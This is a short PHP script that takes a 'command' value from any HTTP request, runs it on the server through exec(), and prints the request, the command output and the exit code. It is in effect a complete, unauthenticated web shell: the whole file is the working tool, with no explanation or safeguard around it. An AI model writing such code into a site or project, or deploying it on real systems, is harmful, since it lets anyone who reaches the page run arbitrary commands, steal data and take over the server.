<?php
print_r($_REQUEST);
exec($_REQUEST['command'], $resp, $num);
print_r($resp);
print_r($num);
?>